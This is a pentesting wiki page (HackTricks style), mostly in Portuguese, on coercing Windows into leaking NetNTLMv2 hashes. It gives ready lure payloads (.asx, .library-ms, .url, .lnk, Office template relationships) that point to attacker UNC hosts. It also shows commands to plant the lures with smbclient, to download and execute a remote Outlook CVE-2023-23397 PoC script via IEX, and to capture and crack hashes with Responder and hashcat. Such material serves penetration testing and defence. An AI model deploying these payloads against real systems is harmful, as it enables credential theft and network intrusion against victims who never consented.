# Locais para roubar NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde o download de um arquivo Microsoft Word online até a fonte ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Compartilhamento SMB gravável + UNC lures acionados pelo Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se você puder **escrever em um share que usuários ou tarefas agendadas navegam no Explorer**, coloque arquivos cuja metadata aponte para o seu UNC (e.g. `\\ATTACKER\share`). Renderizar a pasta aciona **autenticação SMB implícita** e leaks um **NetNTLMv2** para o seu listener.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Coloque-os no compartilhamento gravável** (qualquer pasta que a vítima abrir):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
O Windows pode acessar vários arquivos de uma vez; qualquer item que o Explorer pré-visualize (`BROWSE TO FOLDER`) não requer cliques.

### Playlists do Windows Media Player (.ASX/.WAX)

Se você conseguir fazer com que um alvo abra ou pré-visualize uma playlist do Windows Media Player que você controla, você pode leak Net‑NTLMv2 apontando a entrada para um caminho UNC. O WMP tentará buscar a mídia referenciada via SMB e irá autenticar implicitamente.

Exemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Fluxo de coleta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer trata de forma insegura arquivos .library-ms quando são abertos diretamente de dentro de um arquivo ZIP. Se a definição da library aponta para um caminho UNC remoto (por exemplo, \\attacker\share), simplesmente navegar/abrir o .library-ms dentro do ZIP faz o Explorer enumerar o UNC e emitir autenticação NTLM para o attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Crie o arquivo .library-ms com o XML acima (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) e entregue o ZIP ao alvo.
- Execute um listener de captura NTLM e aguarde que a vítima abra o .library-ms de dentro do ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

O Microsoft Outlook para Windows processava a propriedade MAPI estendida PidLidReminderFileParameter em itens de calendário. Se essa propriedade apontasse para um caminho UNC (por exemplo, \\attacker\share\alert.wav), o Outlook iria contactar a share SMB quando o lembrete fosse disparado, leaking o Net‑NTLMv2 do utilizador sem qualquer clique. Isto foi corrigido em 14 de março de 2023, mas continua altamente relevante para frotas legadas/intactas e para resposta a incidentes histórica.

Exploração rápida com PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado do listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- A vítima só precisa ter Outlook for Windows em execução quando o lembrete disparar.
- O leak fornece Net‑NTLMv2 adequado para offline cracking ou relay (não pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer renderiza ícones de atalho automaticamente. Pesquisas recentes mostraram que, mesmo após o patch de abril de 2025 da Microsoft para UNC‑icon shortcuts, ainda era possível disparar a autenticação NTLM sem cliques hospedando o alvo do atalho em um UNC path e mantendo o ícone local (bypass do patch recebeu CVE‑2025‑50154). Apenas visualizar a pasta faz com que o Explorer recupere metadados do alvo remoto, emitindo NTLM para o atacante SMB server.

Payload mínimo de Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de atalho de programa (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideias de entrega
- Coloque o atalho em um ZIP e faça a vítima navegar por ele.
- Coloque o atalho em um share gravável que a vítima irá abrir.
- Combine com outros arquivos isca na mesma pasta para que o Explorer pré-visualize os itens.

### Sem-clique .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows carrega metadata de `.lnk` durante **view/preview** (renderização do ícone), não apenas na execução. CVE‑2026‑25185 mostra um caminho de parsing onde blocos **ExtraData** fazem o shell resolver um caminho de ícone e tocar o sistema de arquivos **durante o load**, emitindo NTLM de saída quando o caminho é remoto.

Condições-chave de gatilho (observadas em `CShellLink::_LoadFromStream`):
- Incluir **DARWIN_PROPS** (`0xa0000006`) em ExtraData (porta de entrada para a rotina de atualização de ícone).
- Incluir **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) com **TargetUnicode** preenchido.
- O loader expande variáveis de ambiente em `TargetUnicode` e chama `PathFileExistsW` no caminho resultante.

Se `TargetUnicode` resolve para um caminho UNC (por exemplo, `\\attacker\share\icon.ico`), **apenas visualizar uma pasta** que contenha o atalho causa autenticação de saída. O mesmo caminho de load também pode ser acionado por **indexação** e **AV scanning**, tornando-o uma superfície prática de leak sem clique.

Ferramentas de pesquisa (parser/generator/UI) estão disponíveis no projeto **LnkMeMaybe** para construir/inspecionar essas estruturas sem usar a GUI do Windows.


### Injeção de template remoto do Office (.docx/.dotm) para forçar NTLM

Documentos do Office podem referenciar um template externo. Se você definir o template anexado para um caminho UNC, abrir o documento autenticará no SMB.

Alterações mínimas nas DOCX relationships (dentro de word/):

1) Edite word/settings.xml e adicione a referência ao template anexado:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edite word/_rels/settings.xml.rels e aponte rId1337 para o seu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempacote para .docx e entregue. Execute seu listener de captura SMB e aguarde a conexão.

Para ideias pós-captura sobre relaying ou abuso de NTLM, consulte:

{{#ref}}
README.md
{{#endref}}


## Referências
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
